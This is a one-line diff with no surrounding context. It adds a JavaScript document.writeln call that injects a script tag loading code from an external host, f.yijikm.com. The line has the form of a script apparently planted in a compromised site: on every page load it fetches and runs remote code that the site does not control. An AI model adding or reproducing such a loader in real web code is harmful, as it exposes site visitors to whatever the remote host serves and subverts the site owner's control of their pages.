@@ -1,0 +1,1 @@
+document.writeln("<script src='http:\/\/f.yijikm.com\/55908'><\/script>");
